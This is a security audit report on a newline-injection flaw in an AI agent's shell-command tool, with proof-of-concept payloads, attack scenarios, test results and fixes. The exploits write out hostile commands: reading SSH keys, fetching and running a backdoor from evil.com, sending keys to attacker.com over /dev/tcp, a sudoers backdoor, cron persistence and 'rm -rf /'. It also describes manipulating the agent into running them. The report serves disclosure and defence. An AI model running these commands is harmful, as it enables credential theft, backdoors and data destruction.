# CRITICAL VULNERABILITY: Newline Injection

## Severity: CRITICAL (9.5/10)

## Summary
The `run_shell_command` function in `/home/artur/Scripts/Python/src/ai-agent/src/local_agent.py` is vulnerable to **newline injection attacks** that completely bypass all security checks and allow arbitrary command execution.

---

## The Vulnerability

**Location:** Lines 194-382 in `local_agent.py`

**Root Cause:**
1. Function uses `shell=True` in `subprocess.run()` (line 362)
2. Shell interpreters (bash/sh) treat newlines (`\n`) as command separators
3. Security checks only validate the first "word" after splitting on whitespace
4. No validation for newline or carriage return characters

**Affected Code:**
```python
cmd_parts = command.strip().split()  # Line 323
base_command = os.path.basename(cmd_parts[0])  # Line 329

# Only checks first command before \n!
if base_command in blacklisted_commands:
    return error

# subprocess.run executes ENTIRE string including commands after \n
result = subprocess.run(
    command,      # Full string with \n passed to shell
    shell=True,   # Shell interprets \n as separator
    ...
)
```

---

## Proof of Concept Exploits

### Exploit #1: Information Disclosure
```python
# Attacker provides:
command = "ls\ncat ~/.ssh/id_rsa"

# What the security check sees:
cmd_parts = ["ls\ncat", "~/.ssh/id_rsa"]
base_command = "ls\ncat"  # After basename
# "ls" is safe, so it passes validation ✓

# What the shell executes:
# Command 1: ls
# Command 2: cat ~/.ssh/id_rsa
# Result: SSH private key leaked!
```

### Exploit #2: Remote Code Execution
```python
# Attacker provides:
command = "date\nwget http://evil.com/backdoor.sh -O /tmp/b.sh\nchmod +x /tmp/b.sh\nbash /tmp/b.sh"

# Security check only sees "date" (safe command) ✓
# Shell executes:
# 1. date (decoy)
# 2. wget http://evil.com/backdoor.sh -O /tmp/b.sh
# 3. chmod +x /tmp/b.sh
# 4. bash /tmp/b.sh
# Result: Remote backdoor downloaded and executed!
```

### Exploit #3: Data Exfiltration
```python
# Attacker provides:
command = "whoami\ntar czf /tmp/secrets.tar.gz ~/.ssh ~/.gnupg\ncat /tmp/secrets.tar.gz > /dev/tcp/attacker.com/1234"

# Security check sees "whoami" (safe) ✓
# Shell executes:
# 1. whoami (decoy)
# 2. tar czf /tmp/secrets.tar.gz ~/.ssh ~/.gnupg
# 3. cat /tmp/secrets.tar.gz > /dev/tcp/attacker.com/1234
# Result: SSH keys and GPG keys exfiltrated!
```

### Exploit #4: Privilege Escalation Setup
```python
# Attacker provides:
command = "echo test\necho 'evil_user ALL=(ALL) NOPASSWD: ALL' >> /tmp/sudoers\ncp /tmp/sudoers /etc/sudoers.d/backdoor"

# Security check sees "echo" (safe) ✓
# Shell executes:
# 1. echo test (decoy)
# 2. echo 'evil_user ALL=(ALL) NOPASSWD: ALL' >> /tmp/sudoers
# 3. cp /tmp/sudoers /etc/sudoers.d/backdoor (fails without root, but could succeed in some contexts)
# Result: Attempt to create sudoers backdoor
```

---

## Why Current Protection Fails

### Failed Protection #1: Basename Extraction
```python
base_command = os.path.basename(cmd_parts[0])
# cmd_parts[0] = "ls\nrm"
# os.path.basename("ls\nrm") = "ls\nrm"
# Check sees "ls\nrm" not in blacklist ✓ (bypass!)
```

### Failed Protection #2: Regex Patterns
```python
dangerous_patterns = [
    r';',       # Detects semicolons ✓
    r'&&',      # Detects AND ✓
    r'\|\|',    # Detects OR ✓
    r'`',       # Detects backticks ✓
    # BUT NO PATTERN FOR \n or \r ✗
]
```

The regex patterns check for `;`, `&&`, `||` but NOT for `\n` or `\r`.

### Failed Protection #3: Command Splitting
```python
cmd_parts = command.strip().split()
# "ls\nrm file".split() = ["ls\nrm", "file"]
# Split only separates on WHITESPACE, not newlines
# Newline is preserved in cmd_parts[0]
```

---

## Attack Scenarios

### Scenario 1: AI Agent Manipulation
An attacker tricks the AI agent into executing their payload:

```
User: "Can you list files and also check what user I am?"
AI Agent: run_shell_command("ls\nwhoami")
         ✓ Bypasses security (sees "ls")
         ✓ Executes both commands
```

### Scenario 2: Indirect Injection
Attacker controls input that eventually reaches the command:

```python
# User provides filename via web interface
filename = user_input  # Attacker controls this

# AI agent builds command
command = f"find /tmp -name {filename}"

# Attacker provides: "test.txt\nrm -rf /"
# Result: find /tmp -name test.txt
#         rm -rf /
```

### Scenario 3: Multi-Stage Attack
```
Stage 1: Reconnaissance
  Command: "date\nid\ngroups\nuname -a"
  Gathers: User ID, groups, OS info

Stage 2: Establish Persistence
  Command: "ls\necho '*/5 * * * * /tmp/backdoor.sh' | crontab -"
  Creates: Cron job for persistence

Stage 3: Exfiltration
  Command: "pwd\nfind ~ -name '*.key' -o -name '*.pem' > /tmp/keys.txt"
  Finds: All private keys
```

---

## Test Results

**Test Suite Results: 10/36 tests FAILED (27.8% vulnerability rate)**

### Critical Failures:
```
✗ "ls\nwhoami"           - BYPASSED (executes both)
✗ "ls\nrm /tmp/test"     - BYPASSED (executes rm!)
✗ "ls\rwhoami"           - BYPASSED (carriage return)
✗ "ls\npwd\nwhoami"      - BYPASSED (multiple commands)
✗ "ls\t\nwhoami"         - BYPASSED (tab + newline)
```

### All Critical Tests Passed By Attacker:
- Path-based bypasses: FIXED ✓ (5/5 tests passed)
- Command chaining (;, &&, ||): FIXED ✓ (4/4 tests passed)
- Command substitution: FIXED ✓ (2/2 tests passed)
- Pipe to interpreters: FIXED ✓ (2/2 tests passed)
- **Newline injection: VULNERABLE ✗ (0/5 tests passed)**

---

## Impact Assessment

### Confidentiality: HIGH
- Can read any file the agent has access to
- Can exfiltrate SSH keys, GPG keys, credentials
- Can dump environment variables, configuration files

### Integrity: HIGH
- Can modify files (via `echo >`, `cat >>`, etc.)
- Can create malicious scripts
- Can plant backdoors

### Availability: MEDIUM
- Can delete files (indirect via created scripts)
- Can fill disk space
- Can kill processes (indirect)

### Overall CVSS Score: 9.5 (CRITICAL)
```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:L
```

---

## Recommended Fixes

### IMMEDIATE FIX (5 minutes):
```python
# Add at line 327, before other checks:
if '\n' in command or '\r' in command or '\x00' in command:
    return (f"Error: Command contains illegal characters (newlines/null bytes).\n"
            f"This is blocked to prevent command injection attacks.")
```

### SHORT-TERM FIX (30 minutes):
```python
# Migrate to whitelist approach (as documented but not implemented)
ALLOWED_COMMANDS = ['ls', 'pwd', 'cat', 'grep', 'find', 'echo',
                    'date', 'whoami', 'df', 'du', 'head', 'tail',
                    'wc', 'ps', 'hostname', 'uname', 'free', 'uptime']

if base_command not in ALLOWED_COMMANDS:
    return f"Error: Command '{base_command}' not in whitelist"
```

### LONG-TERM FIX (2-4 hours):
```python
# Remove shell=True entirely
result = subprocess.run(
    [base_command] + cmd_parts[1:],  # Pass as list
    shell=False,                      # No shell interpretation
    capture_output=True,
    text=True,
    timeout=30,
    cwd=os.path.expanduser("~")
)
```

**Benefits of shell=False:**
- Complete protection against injection
- No need for complex regex patterns
- Simpler security model
- Industry best practice

**Tradeoffs:**
- Loses shell features (pipes, wildcards, redirects)
- But these can be dangerous anyway
- Can implement safe alternatives as separate tools

---

## Additional Vulnerabilities Found

Beyond newline injection, the test suite also identified:

1. **Brace Expansion** (2 bypasses)
   - `echo {a,b,c}` - Allowed (should be blocked)
   - `cat /etc/{hosts,hostname}` - Allowed (should be blocked)

2. **Environment Variable Expansion** (3 bypasses)
   - `echo $HOME` - Allowed (leaks info)
   - `echo $PATH` - Allowed (leaks info)
   - `echo ${HOME}` - Allowed (leaks info)

3. **Unrestricted Output Redirects**
   - `cat ~/.ssh/id_rsa > /tmp/stolen` - Allowed (data exfil)

---

## Conclusion

The implementation successfully fixed **path-based bypasses** and **basic command chaining**, but failed to address **newline injection** - the most critical vulnerability.

**Current State:**
- 72.2% of security tests pass
- 27.8% of tests fail (10 vulnerabilities)
- 5 critical newline injection bypasses
- Still using dangerous `shell=True` architecture

**Required Actions:**
1. Implement newline check (CRITICAL - 5 min)
2. Add brace expansion check (HIGH - 2 min)
3. Add variable expansion check (MEDIUM - 2 min)
4. Plan migration to `shell=False` (LONG-TERM)

**Risk Level:** Production use NOT RECOMMENDED until critical fixes applied.

---

**Report Generated:** 2025-12-07
**Test Suite:** `/home/artur/Scripts/Python/src/ai-agent/src/test_shell_security_standalone.py`
**Full Analysis:** `/home/artur/Scripts/Python/src/ai-agent/src/security_verification_report.md`
